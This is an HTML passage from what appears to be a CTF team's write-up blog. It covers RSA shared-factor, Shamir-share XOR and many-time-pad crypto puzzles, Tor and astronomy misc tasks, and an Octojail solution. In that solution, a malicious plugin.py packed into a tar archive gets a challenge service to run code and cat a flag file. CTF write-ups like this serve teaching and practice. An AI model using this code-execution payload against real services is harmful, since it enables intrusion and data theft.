</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;pass.png&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Wrote pass.png (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes)&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="final-notes">Final notes<a hidden class="anchor" aria-hidden="true" href="#final-notes">#</a></h4>
<p>The strings that resemble hexadecimal are never interpreted‚Äîcomparison occurs over their literal ASCII bytes. Allowing color type 6 would not add value here, so color type 2 keeps palette and alpha concerns away. Because no decompression takes place, an empty <code>IDAT</code> suffices. Any deviation‚Äîincorrect length, altered constant, missing chunk, or CRC mismatch‚Äîcauses an early abort before output. The result is a deliberately tiny, deterministic PNG acting as a gate token.</p>
<h2 id="cryptography-">Cryptography üîë<a hidden class="anchor" aria-hidden="true" href="#cryptography-">#</a></h2>
<h3 id="repeated-rsa">Repeated RSA<a hidden class="anchor" aria-hidden="true" href="#repeated-rsa">#</a></h3>
<h4 id="challenge-recap-1">Challenge Recap<a hidden class="anchor" aria-hidden="true" href="#challenge-recap-1">#</a></h4>
<p>We&rsquo;re given three RSA moduli (<code>n1</code>, <code>n2</code>, <code>n3</code>), all using the same exponent <code>e = 65537</code>. The ciphertext is the result of encrypting the message three times in a row, each time with a different modulus:</p>
<pre tabindex="0"><code>c = (((m^e mod n1)^e mod n2)^e mod n3)
</code></pre><p>At first glance, this seems secure, but if the moduli share factors, it&rsquo;s game over.</p>
<h4 id="solution-outline">Solution Outline<a hidden class="anchor" aria-hidden="true" href="#solution-outline">#</a></h4>
<p>The trick is to compute <code>gcd(n1, n2)</code>, <code>gcd(n1, n3)</code>, and <code>gcd(n2, n3)</code>. If any two moduli share a prime, we can factor all three. Once factored, we build the private keys and decrypt in reverse order: first with <code>n3</code>, then <code>n2</code>, then <code>n1</code>.</p>
<h4 id="flag-1">Flag<a hidden class="anchor" aria-hidden="true" href="#flag-1">#</a></h4>
<p>After running the script below, we get:</p>
<pre tabindex="0"><code>ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
</code></pre><h4 id="script">Script<a hidden class="anchor" aria-hidden="true" href="#script">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">gcd</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span> <span class="n">inverse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Challenge values</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">2229410785527946317635364774835292537483430453984495968574494831489047511519958312643881040641578057858931772803087607196012820296369991164107190948310356463417861035390638326851534142542103526375383172540030343927746771738799447167088443458066616851627575911524859083341172154834543040819704989345198246040617497799700950352682267005468487799262768129094123040337376295511924024484544629539421615022888720629965699207349794944046966222571007666851195733165359026061537015238737950972546865047312074247990897947567884264249056289574648161671615170915053555370841724466794474851165471362350494797978194583192518797381</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">n1</span> <span class="o">=</span> <span class="mi">13852404208507408802969880487839186284776154658591414025042810686360400013127774847502340273305623845274604456776137166609277405684272007689391356639812356940155331180589738056370147100521557117036516708000178035092048663373455750305534323237059838602263431659551056045872580098364916417474039437912346894641330241402004752256659954856461727024372071766854017300857517546611231762952091418981114953473216240892822633582203036320527992573432136583591014349994351427032781965145608630820018051050230075720564731871368372231470262203086280844504502775043017498384280801239614982205079609753900100398376733169246631316697</span>
</span></span><span class="line"><span class="cl"><span class="n">n2</span> <span class="o">=</span> <span class="mi">15748152637796365368137797706527996298608215337890456927269038427926846674691875943720267244971370381141809968407326275871803323803581747080314261544332485943731368852655067850896471516625029143112165627812077473064608440710660175236759248240948340814185051448703647632058286116397397691070755741060583490520669070244688435237540855552495653539878452018167471132051693278659684051653781709747003764842364559170399285523872122266225774567096641020505614377038167072257628092601965141968408685390940655538238777830526254664009592049149365322701602030688998803373578751050513395088465372935837841398695709538326833988663</span>
</span></span><span class="line"><span class="cl"><span class="n">n3</span> <span class="o">=</span> <span class="mi">10350896177175682007511598805028847600137957487117302062774813138763351873593461980448507272975998922468304798492231343207761721052707925786605782262384443768443219123262577713511594839594866845184827842152808031728489381010507440385762073119185629148978446717167630278423961814139187655047721925334093648039612144978295204796441976465669226134091497180200823086476742877790199362529738446378742848779718268504162670333572717406001792954174770141580935396469598959195786473885584655334451105910342984708040600874391592823123912819842735773171990927274721245258273810346405096613207897653796787022916757597225522651119</span>
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Factorization</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span> <span class="n">n2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">q1</span> <span class="o">=</span> <span class="n">n1</span> <span class="o">//</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl"><span class="n">q2</span> <span class="o">=</span> <span class="n">n2</span> <span class="o">//</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span> <span class="n">n3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">q3</span> <span class="o">=</span> <span class="n">n3</span> <span class="o">//</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Private exponents</span>
</span></span><span class="line"><span class="cl"><span class="n">phi1</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q1</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">phi2</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q2</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">phi3</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q3</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">d1</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">d2</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">d3</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Decrypt in reverse</span>
</span></span><span class="line"><span class="cl"><span class="n">step2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d3</span><span class="p">,</span> <span class="n">n3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">step1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">step2</span><span class="p">,</span> <span class="n">d2</span><span class="p">,</span> <span class="n">n2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">step1</span><span class="p">,</span> <span class="n">d1</span><span class="p">,</span> <span class="n">n1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Convert to bytes</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></div><h3 id="sss">SSS<a hidden class="anchor" aria-hidden="true" href="#sss">#</a></h3>
<p>This challenge ships three big hex blobs named <code>P1</code>, <code>P2</code>, and <code>P3</code>:</p>
<ul>
<li><code>P1=&quot;8010ba0d6ed3...&quot;</code></li>
<li><code>P2=&quot;80264e325aa0...&quot;</code></li>
<li><code>P3=&quot;8036f43f3473...&quot;</code></li>
</ul>
<p>The description (&ldquo;Shamir will be proud&rdquo;) screams <strong>Shamir‚Äôs Secret Sharing (SSS)</strong>. With three attachments and no other parameters given, the most natural setup is a <strong>3-of-3</strong> scheme over GF($2^8$) (the byte field) where we‚Äôre meant to reconstruct the secret.</p>
<h4 id="what-the-attachments-are">What the attachments are<a hidden class="anchor" aria-hidden="true" href="#what-the-attachments-are">#</a></h4>
<p>Each <code>P*</code> is a <strong>hex-encoded share</strong>. Before doing any math it helps to peek at basic structure:</p>
<ul>
<li>All three start with <code>0x80</code> followed by one varying byte (<code>0x10</code>, <code>0x26</code>, <code>0x36</code> respectively).</li>
<li>After those first <strong>2 bytes</strong>, the remaining bytes in each blob have the <strong>same length</strong>.</li>
</ul>
<p>That strongly suggests a tiny <strong>2-byte header/metadata</strong> (common in homegrown or library share formats, e.g., a tag/version and/or index), followed by the <strong>actual share payload</strong> (the y-values of a Shamir point). We don‚Äôt need the metadata to reconstruct the secret, so we can safely drop those two bytes from each blob and work on the aligned bodies.</p>
<h4 id="the-key-idea">The key idea<a hidden class="anchor" aria-hidden="true" href="#the-key-idea">#</a></h4>
<p>Shamir‚Äôs reconstruction at $x=0$ uses Lagrange interpolation. If the three shares are at $x\in{1,2,3}$ (a very common choice), then in <strong>characteristic 2</strong> fields (like GF(2‚Å∏)), the Lagrange coefficients at $x=0$ come out to <strong>1, 1, 1</strong>:</p>
$$
\lambda_1=\frac{(0-2)(0-3)}{(1-2)(1-3)}=\frac{(2)(3)}{(3)(2)}=1,\quad
\lambda_2=\frac{(0-1)(0-3)}{(2-1)(2-3)}=\frac{(1)(3)}{(1)(3)}=1,\quad
\lambda_3=\frac{(0-1)(0-2)}{(3-1)(3-2)}=\frac{(1)(2)}{(2)(1)}=1.
$$<p>In characteristic 2, addition is XOR. So the secret at $x=0$ is simply the <strong>bytewise XOR</strong> of the three share payloads:</p>
$$
\text{secret} = y_1 \oplus y_2 \oplus y_3.
$$<p>(If you‚Äôre skeptical about the sample points, the quickest sanity check is to try XOR anyway-if it yields something legible, you‚Äôre done. It does. üôÇ)</p>
<h4 id="recovering-the-secret">Recovering the secret<a hidden class="anchor" aria-hidden="true" href="#recovering-the-secret">#</a></h4>
<ol>
<li>
<p><strong>Parse hex</strong>, <strong>drop the first 2 bytes</strong> (header) from each share.</p>
</li>
<li>
<p><strong>XOR</strong> the three bodies byte-for-byte.</p>
</li>
<li>
<p>Inspect the result:</p>
<ul>
<li>The bytes pattern looks like <code>00 63 00 74 00 66 ...</code> which is <strong>UTF-16BE</strong>.</li>
<li>Reading from the <strong>end</strong> you‚Äôll spot <code>00 7B 00 66 00 74 00 63</code> -&gt; <code>{ftc</code>, i.e. the text is <strong>reversed</strong>.</li>
</ul>
</li>
<li>
<p>Decode as <strong>UTF-16BE</strong>, then <strong>reverse the string</strong>.</p>
</li>
</ol>
<h5 id="minimal-reproduction">Minimal reproduction<a hidden class="anchor" aria-hidden="true" href="#minimal-reproduction">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">P1</span> <span class="o">=</span> <span class="s2">&#34;8010ba0d6ed38ef563074c3ee80a44f7fe680e82015a8d35f7f2245f66ec9c889b4e31a0c3e97bceeb6f28695f7a494918e0ca079677f07fff8eb570c17a4cb1db0477b84e9c68b9f02b21b33850f33bbd18f886b65c1f3bb015ddbe2723e64abfe8595e181d69d3f8ca3b7cc01c875ea25b97ef1e171c4f3f887e5752541270ae461cc610b3eb422c34df84e7b9a567f7933ee4b6969d19273d212a3ee92f8509679a4b40b6823c007e6d5c6241959e86bc8f989754649cd3008bdbb5bf030c9e802adf54d3afce4edef9bb709c7db4c2ac1f96f3e05cd220534b5647f35888e0e3d2435abdb1d7f32413bb630b3e8b0502e774dda8ac2bd4c2623ac433f79bd12&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">P2</span> <span class="o">=</span> <span class="s2">&#34;80264e325aa037314746964303cf6fee98d64e1e03d613fb8f327f5241850adbd06e1f959bdb6e5bd35874188e3fa4740a1948befcacb8949350574825ba4519793a6a617048fb2f5bdd9bc3267a61051484ec16e83ff7baaafac81a3aa4fb2077da312ee4f00c705b8f626334ff3045e41f451858988a3549e314f8a70f0879f5a30fbcd5fcc1645575186af8a434876304bb1ebc360533389143f7d918682307736bac713b63338482ef1cf80ac415f213625231ef3d3bdd70f811c8cc7515cf83a74ea25c31264a9a5dbe0615c5959e181bf8effa1698ece11cb5e9c794d381311ba1900f0c550f33b61fd49959d9b4ba73588b14906fddb625bd13f7149a95a&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">P3</span> <span class="o">=</span> <span class="s2">&#34;8036f43f3473b9c42441da7debc52b1966be409c028c9ece78c05b0d276996534b202e355832159538375c71d145ed3d12f982b96adb48eb6cdee238e4c009a8a23e1dd93ed49396abf6ba701e2a923ea99c14905e63e8811aef15a41d871d6ac8326870fced65a3a345591ff4e3b71b4644d2f7468f966a71bb698ff6cb198958d5105ac65f2c367a31c4fe1c0d97b09717867a09209e0a1cac64ede1c144d60854f7c7321de22f82ec8470991b57db729feb8aa0eb5ab7081070aa7b33755952238b81f5cf9dc80724a26575d9bba15ae4027e1f9a490acfd25183adb4ca1b62a2ca92c9a2bee2fa27a634b4b26402b298975c509c3f240f344037d1a4e44142b&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">body</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">h</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span><span class="p">:</span> <span class="n">h</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="n">h</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="o">^</span> <span class="n">c</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">body</span><span class="p">(</span><span class="n">P1</span><span class="p">),</span> <span class="n">body</span><span class="p">(</span><span class="n">P2</span><span class="p">),</span> <span class="n">body</span><span class="p">(</span><span class="n">P3</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-16-be&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00\x01</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="solution-2">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-2">#</a></h4>
<p>By XORing the three share bodies and decoding the result as <strong>UTF-16BE</strong>, then reversing the string, we get:</p>
<pre tabindex="0"><code>ctf{d6b72529c6177d8f648ae85f624a24d6f1edce5ca29bd7cc0b888e117a123892}
</code></pre><p>That‚Äôs the whole trick: treat the first two bytes as metadata, use the Shamir hint to try XOR (valid for $x\in{1,2,3}$ over GF($2^8$)), and recognize the reversed UTF-16BE output.</p>
<h3 id="xorbitant">XORbitant<a hidden class="anchor" aria-hidden="true" href="#xorbitant">#</a></h3>
<p>This challenge provides two attachments, a Python script and a binary dump.
The challenge essentially consists of decrypting a ciphertext encrypted with the XOR between a very large plaintext and the flag.</p>
<p>This encryption operation is performed by the following code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">input_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">output_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">,</span><span class="s2">&#34;CTF</span><span class="si">{example_flag}</span><span class="s2">&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key_bytes</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk_size</span> <span class="o">=</span> <span class="mi">4096</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">chunk</span> <span class="o">:=</span> <span class="n">infile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunk_size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">xored</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">chunk</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">            <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">xored</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">xor</span><span class="p">(</span><span class="s2">&#34;plaintext.txt&#34;</span><span class="p">,</span><span class="s2">&#34;out.bin&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>This code is potentially vulnerable to frequency attacks but also to many-time-pad attacks (since the flag is reused on blocks of 69 characters, <code>ctf{sha256sum}</code>).
In our case, we preferred to reconstruct the flag using the CLI tool <code>mtp</code> and, as we progressively uncovered parts of the text, we revealed the flag character by character.</p>
<p>To do this, it was enough to simply divide the ciphertext into 69-byte chunks, encode them in hexadecimal, and write them line by line into a txt file to then feed them to the aforementioned tool.</p>
<p>Once this was done we could guess the first 4 bytes since we knew the flag started with <code>ctf{</code>.</p>
<h2 id="miscellaneous-">Miscellaneous üêß<a hidden class="anchor" aria-hidden="true" href="#miscellaneous-">#</a></h2>
<h3 id="octojail">Octojail<a hidden class="anchor" aria-hidden="true" href="#octojail">#</a></h3>
<h4 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h4>
<p>A Python service reads a string of octal digits (triplets), converts them to bytes, treats the result as a tar archive, extracts it into <code>uploads/</code> (with basic path checks), then imports <code>plugin.py</code> and calls <code>run()</code> if present. The service enforces a 6-second timeout, requires octal-only input of length multiple of 3, and limits input size.</p>
<h4 id="key-observation">Key Observation<a hidden class="anchor" aria-hidden="true" href="#key-observation">#</a></h4>
<ul>
<li>The service executes <code>plugin.run()</code> from an extracted <code>plugin.py</code> ‚Äî <strong>arbitrary code execution</strong> via a supplied tar archive.</li>
</ul>
<h4 id="exploitation-strategy">Exploitation Strategy<a hidden class="anchor" aria-hidden="true" href="#exploitation-strategy">#</a></h4>
<ol>
<li>Create a <code>plugin.py</code> that performs the desired action (e.g., <code>ls</code> or read <code>flag.txt</code>).</li>
<li>Pack <code>plugin.py</code> into a tar archive.</li>
<li>Convert the tar bytes to an octal-triplet string.</li>
<li>Provide that octal string to the service&rsquo;s.</li>
<li>The service extracts the archive and runs <code>plugin.run()</code>, executing your code.</li>
</ol>
<p><strong>Read a flag file:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># plugin.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar cf plugin.tar plugin.py
</span></span></code></pre></div><p>Convert the tar bytes to octal-triplets (Python):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># tar_to_octal.py</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;plugin.tar&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">octal</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">b</span><span class="si">:</span><span class="s2">03o</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">octal</span><span class="p">)</span>
</span></span></code></pre></div><p>This prints the octal string to paste into the target program&rsquo;s prompt.</p>
<h4 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h4>
<p>After we sent our script as an octal string and the server execute it we will get the flag</p>
<h3 id="onions1">onions1<a hidden class="anchor" aria-hidden="true" href="#onions1">#</a></h3>
<p><strong>onions1</strong> is a simple but fun misc challenge that introduces you to the world of .onion (Tor hidden) services.</p>
<p>The task: just visit the following .onion URL using the Tor Browser:</p>
<pre tabindex="0"><code>2ujjzkrfk4ls4r6vbvvkpn5nyouimcw5hjarezbznvsowfjzup7otdad.onion
</code></pre><p>Once you fire up Tor and head to the link, you‚Äôre greeted with the following page:</p>
<p><img alt="Screenshot of the .onion page" loading="lazy" src="/images/onions1.png"></p>
<p>That‚Äôs it! Sometimes the challenge is just about knowing the right tool‚Äîin this case, Tor Browser.<br>
If you‚Äôve never used it before, this is a great excuse to try it out and see how .onion sites work.</p>
<h3 id="escaping-barcellona">Escaping Barcellona<a hidden class="anchor" aria-hidden="true" href="#escaping-barcellona">#</a></h3>
<p>In this challenge, the goal was to determine the distance between Mars and Barcellona at a specific date and time. The problem allowed a tolerance of ¬±0.009 million kilometers, which proved to be quite generous. This margin, combined with some luck probably, made it possible to bypass the need for Barcellona‚Äôs exact coordinates and instead focus on the Earth-Mars distance as a whole.</p>
<p>To solve this, I used the Astropy library, which provides precise astronomical calculations. By leveraging the JPL ephemeris, I ensured the positions of the planets were as accurate as possible for the given date and time. The script calculates the barycentric positions of both Mars and Earth, then computes the Euclidean distance between them. This approach sidesteps the need for a specific location on Earth, since the difference at this scale is negligible within the allowed tolerance.</p>
<p>Here‚Äôs the script I used:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">astropy.coordinates</span> <span class="kn">import</span> <span class="n">EarthLocation</span><span class="p">,</span> <span class="n">get_body_barycentric</span><span class="p">,</span> <span class="n">solar_system_ephemeris</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">astropy.time</span> <span class="kn">import</span> <span class="n">Time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">astropy.units</span> <span class="k">as</span> <span class="nn">u</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">obs_time</span> <span class="o">=</span> <span class="n">Time</span><span class="p">(</span><span class="s2">&#34;2025-11-07 16:00:00&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">solar_system_ephemeris</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;jpl&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mars_pos</span> <span class="o">=</span> <span class="n">get_body_barycentric</span><span class="p">(</span><span class="s1">&#39;mars&#39;</span><span class="p">,</span> <span class="n">obs_time</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">earth_pos</span> <span class="o">=</span> <span class="n">get_body_barycentric</span><span class="p">(</span><span class="s1">&#39;earth&#39;</span><span class="p">,</span> <span class="n">obs_time</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">mars_pos</span> <span class="o">-</span> <span class="n">earth_pos</span><span class="p">)</span><span class="o">.</span><span class="n">norm</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">distance_km</span> <span class="o">=</span> <span class="n">distance</span><span class="o">.</span><span class="n">to</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">km</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Distance from Earth to Mars at </span><span class="si">{</span><span class="n">obs_time</span><span class="o">.</span><span class="n">iso</span><span class="si">}</span><span class="s2"> UTC: </span><span class="si">{</span><span class="n">distance_km</span><span class="si">:</span><span class="s2">.3f</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="onions2">Onions2<a hidden class="anchor" aria-hidden="true" href="#onions2">#</a></h3>
<p>Onions2 was a tougher and more intriguing misc challenge centered around .onion (Tor hidden) sites.</p>
<p>We kicked things off by uploading the image provided by the challenge to <a href="https://www.aperisolve.com/">Aperisolve</a>. Hidden within the image data, we discovered a .onion URL.</p>
<p>Curious, we fired up Tor and visited the site. At first glance, the page looked empty, there was nothing obvious to interact with. After poking around for a while, we stumbled upon a font file hosted on the site. Inside this font file, we found another hidden string.</p>
<p>We ran this mysterious string through CyberChef, which revealed a new clue:
<img alt="alt text" loading="lazy" src="/images/cyberchef-onions2.png"></p>
<p>CyberChef decoded the string into a Google Maps link:<br>
